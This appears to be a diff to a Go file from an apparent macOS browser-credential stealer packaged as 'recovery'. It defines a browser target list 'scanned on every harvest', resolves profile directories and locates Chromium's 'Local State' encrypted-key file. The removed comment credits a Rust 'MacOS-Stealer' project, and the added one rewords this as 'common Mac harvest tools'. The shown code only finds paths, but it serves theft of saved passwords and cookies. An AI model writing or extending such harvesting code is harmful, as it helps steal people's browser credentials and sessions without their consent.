@@ -1,8 +1,12 @@
 //go:build darwin
 
-// macOS Chromium/Firefox paths follow the same Application Support layout as
-// JayGLXR/MacOS-Stealer-in-Rust (src/browsers.rs): Chrome, Firefox, Brave, Edge,
-// Vivaldi, Yandex, Opera, Opera GX under ~/Library/Application Support/.
+// Package browser enumerates installed browsers and their profile directories.
+//
+// macOS Chromium/Firefox paths follow the Application Support layout used by
+// common Mac harvest tools (Chrome, Firefox, Brave, Edge, Vivaldi, Yandex,
+// Opera, Opera GX, Arc under ~/Library/Application Support/).
+//
+// FlatProfile browsers (Opera) store data at UserData root instead of Profile N.
 package browser
 
 import (
@@ -13,6 +17,7 @@ import (
 	"recovery/recovery/types"
 )
 
+// Browsers is the ordered list of targets scanned on every harvest.
 var Browsers = []types.BrowserConfig{
 	// Chromium family
 	{Name: "Chrome", UserDataPath: "Google/Chrome", ProcessName: "Google Chrome"},
@@ -32,19 +37,23 @@ var Browsers = []types.BrowserConfig{
 	{Name: "Waterfox", UserDataPath: "Waterfox", ProcessName: "waterfox", IsFirefox: true},
 }
 
+// GetLocalAppData returns ~/Library/Application Support (Chromium "User Data" parent).
 func GetLocalAppData() string {
 	home, _ := os.UserHomeDir()
 	return filepath.Join(home, "Library", "Application Support")
 }
 
+// GetUserDataRoot is the browser's user-data directory (contains Local State + profiles).
 func GetUserDataRoot(cfg types.BrowserConfig) string {
 	return filepath.Join(GetLocalAppData(), cfg.UserDataPath)
 }
 
+// LocalStatePath is Chromium's encrypted-key metadata file.
 func LocalStatePath(cfg types.BrowserConfig) string {
 	return filepath.Join(GetUserDataRoot(cfg), "Local State")
 }
 
+// FindProfileDirs discovers Default / Profile N (or a single flat profile) under cfg.
 func FindProfileDirs(cfg types.BrowserConfig) []types.ProfileInfo {
 	root := GetUserDataRoot(cfg)
 
